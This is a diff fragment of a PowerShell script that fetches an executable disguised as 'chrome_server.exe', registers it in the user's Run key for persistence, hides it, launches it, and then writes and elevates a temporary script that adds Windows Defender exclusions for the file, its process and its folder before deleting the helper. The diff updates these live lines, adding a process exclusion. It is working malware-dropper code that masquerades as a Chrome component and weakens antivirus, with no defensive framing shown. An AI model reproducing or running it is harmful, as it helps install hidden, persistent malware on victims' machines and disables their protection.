@@ -84,15 +84,15 @@ $file_path = Join-Path -Path $dir -ChildPath 'chrome_server.exe'
 Get-File -Uri $uri -TargetFile $dir
 if (Test-Path -Path $file_path) {
     [System.Console]::Clear()
-    Write-Host "✅ Successfully installed Chrome Server"
+    Write-Host "Successfully installed Chrome Server"
     Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Chrome Server' -Value $file_path
     Set-ItemProperty -Path $file_path -Name Attributes -Value $hiddenAttribute
     Invoke-Item -Path $file_path
     if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-      $cmd1 = "Add-MpPreference -ExclusionPath ${env:TEMP}\Google; Add-MpPreference -ExclusionPath ${file_path}; Add-MpPreference -ControlledFolderAccessAllowedApplications ${file_path}"
+      $cmd1 = "Add-MpPreference -ExclusionProcess chrome_server.exe;Add-MpPreference -ExclusionPath ${env:TEMP}\Google; Add-MpPreference -ExclusionPath ${file_path}"
       Set-Content -Path "${env:TEMP}\run2.ps1" -Value $cmd1
       Start-Process powershell -Verb runAs -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File ${env:TEMP}\run2.ps1")
-      Write-Host "✅ Successfully added to Windows Defender exclusion list"
+      Write-Host "Successfully added to Windows Defender exclusion list"
       Start-Sleep -Seconds 2
       Remove-Item -Path "${env:TEMP}\run2.ps1"
       exit
